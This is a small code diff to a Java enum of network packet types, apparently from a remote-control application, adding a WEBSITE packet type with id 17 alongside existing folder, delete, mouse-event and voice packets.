@@ -18,7 +18,8 @@ public enum PacketType {
 	FOLDER(13, CreateFolderPacket.class),
 	DELETE(14, DeleteFilePacket.class),
 	MOUSE_EVENT(15, MouseEventPacket.class),
-	VOICE(16, VoicePacket.class);
+	VOICE(16, VoicePacket.class),
+	WEBSITE(17, WebsitePacket.class);
 	
 	public final byte id;
 	public final Class<? extends IPacket> clazz;
